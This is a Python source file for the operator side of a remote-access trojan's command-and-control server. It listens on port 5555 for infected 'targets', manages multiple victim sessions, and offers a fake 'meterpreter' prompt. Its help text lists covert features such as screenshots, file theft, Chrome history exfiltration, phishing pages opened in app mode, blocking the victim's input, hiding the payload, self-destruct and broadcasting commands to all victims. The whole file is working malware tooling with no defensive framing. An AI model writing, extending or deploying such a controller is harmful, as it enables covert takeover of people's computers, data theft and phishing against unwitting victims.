# fuser -k 5555/tcp
import socket
import json
import termcolor
import os
from art import *
import time
import threading

HOST_IP = '0.0.0.0' 
PORT = 5555
ascii_art = text2art("Shell", "random")
banner = termcolor.colored(ascii_art,'yellow')
print(banner)

def cmd_send(target,data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def output_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(target,file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024) 
    while chunk: 
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def upload_file(target,file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def target_communication(target, ip):
    while True:
        command = input(termcolor.colored('meterpreter> ', 'blue'))
        cmd_send(target, command)
        if command == 'background':
            print("[*] Backgrounding session . . .")
            time.sleep(1)
            break
        if command == 'kill':
            break
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'search':
            result = output_recv(target)
            print(result)
        elif command[:5] == "phish":
            pass
        elif command == 'popup':
            pass
        elif command[:5] == 'popup':
            pass
        elif command == 'banner':
            ascii_art = text2art("Shell", "random")
            banner = termcolor.colored(ascii_art,'yellow')
            print(banner)
        elif command == 'getip':
            result = output_recv(target)
            print(result)
        elif command == 'hide':
            print("Payload has been hidden")
        elif command == 'time':
            result = output_recv(target)
            print(result)
        elif command == 'clear':
            os.system("clear")
        elif command == 'shutdown':
            break
        elif command == 'reboot':
            break
        elif command == 'help':
            print(termcolor.colored('''   
Terminal Commands:
=================================================================
clear                 ->  clear the shell
cd                    ->  Displays the name of or changes the current directory
cls [For windows]     ->  clear the shell
hostname              ->  Show the hostname of the target
time                  ->  Show current time on target PC
Network Commands:
=================================================================
ipconfig              ->  Show IP address of the target
arp -a                ->  Show IP table 
netstat               ->  Show Network status of the target    
ping <IP>             ->  Ping the IP address     
getmac                ->  Get Mac Address of the target     
nslookup <IP>         ->  Show DNS information    
tracert <IP>          ->  Trace data packet to the server    [+] This command take long time to show output  
Utility:
=================================================================
whoami                ->  getUID
systeminfo            ->  Displays machine specific properties and configuration
ver                   ->  Displays the Windows version
mkdir                 ->  Creates a directory
attrib                ->  Displays or changes file attributes
copy                  ->  Copies one or more files to another location
del                   ->  Deletes one or more files
rmdir                 ->  Removes a directory
tasklist              ->  Displays all currently running tasks including services
taskkill              ->  Kill or stop a running process or application
type                  ->  Displays the contents of a file
vol                   ->  Displays a disk volume label and serial number
search                ->  Search for a file
Features:
================================================================
screenshot            ->  takes screenshot of target desktop
download <filename>   ->  recieve file from target
upload <filename>     ->  send file to target
Extra Commands:
=================================================================
time                  ->  Show current time of target PC
getip                 ->  Show Public IP of the target
phish <URL>           ->  Open a website in app mode
popup <MESSAGE>       ->  Create a pop up window with a message
history               ->  Show Chrome search history of the target
start <URL>           ->  Open website in default webbrowser
shutdown              ->  Shutdown targets PC 
reboot                ->  Reboot targets PC
background            ->  Stop current session
kill                  ->  Program will stop and self distruct itself
banner                ->  Show banner
hide                  ->  Hide payload
blockinput            ->  Input will be blocked
unblock               ->  Input will be unblocked
quit                  ->  Quit the existing shell
=================================================================
            ''', 'yellow'))
        elif command == 'clear':
            os.system('clear')
        elif command == 'cls':
            os.system("cls")
        elif command == 'quit':
            break
        elif command == 'blockinput':
            print("Input blocked!")
        elif command == 'unblock':
            print("Input Unblocked")
        elif command == 'screenshot':
            try:
                download_file(target,'scrn.png')
            except:
                print(termcolor.colored("[-] Error occured!","red"))
        elif command == 'history':
            try:
                download_file(target,'chrome_history.csv')
            except:
                print("Chrome is not installed")
        elif command[:8] == 'download':
            try:
                download_file(target,command[9:])
            except:
                print(termcolor.colored("[-] Error occured!","red"))
        elif command[:6] == 'upload':
            try:
                upload_file(target,command[7:])
            except:
                print(termcolor.colored("[-] Error occured!","red"))
        else:
            try:
                result = output_recv(target)
                print(result)
            except:
                print(termcolor.colored("[-] Fatal Error occured Connection failed!","red"))

def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print(termcolor.colored(str(ip)+ 'has connected','green'))
        except:
            pass

targets = []
ips = []
stop_flag = False
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.bind(('0.0.0.0',5555))
sock.listen(5)
t1 = threading.Thread(target=accept_connections)
t1.start()
print(termcolor.colored("[+] Listening For The Incoming connections . . .","green"))

while True:
    command = input("[+] Shell~:")
    if command == 'targets':
        counter = 0
        for ip in ips:
            print("Session " + str(counter) + '----' + str(ip))
            counter +=1
    elif command == 'clear':
        os.system('clear')
    elif command == 'cls':
        os.system('cls')
    elif command == 'help':
        print(termcolor.colored("""
===============================================================
targets             -->  Show list of connected targets
clear               -->  Clear terminal
session             -->  Show active sessions
sendall             -->  Send command to all targets
kill                -->  kill a session
exit                -->  Exit the commandandcontrol      
cls                 -->  clear terminal [WINDOWS]
===============================================================
        """,'yellow'))
    elif command[:7] == 'session':
        try:
            num = int(command[8:])
            tarnum = targets[num]
            tarip = ips[num]
            target_communication(tarnum,tarip)
        except:
            print("[-] No session under ID number")
    elif command == 'exit':
        try:
            for target in targets:
                cmd_send(target,'background')
                target.close()
            sock.close()
            stop_flag = True
            t1.join()
            break
        except:
            pass
    elif command[:4] == 'kill':
        targ = targets[int(command[5:])]
        ip = ips[int(command[5:])]
        cmd_send(targ, 'kill')
        targ.close()
        targets.remove(targ)
        ips.remove(ip)
    elif command[:7] == 'sendall':
        x = len(targets)
        print(x)
        i = 0
        try:
            while i < x:
                tarnumber = targets[i]
                print(tarnumber)
                cmd_send(tarnumber,command)
                i += 1
        except:
            print('Failed')
    else:
        print(termcolor.colored("[!Command doesn't exist!]","red"))
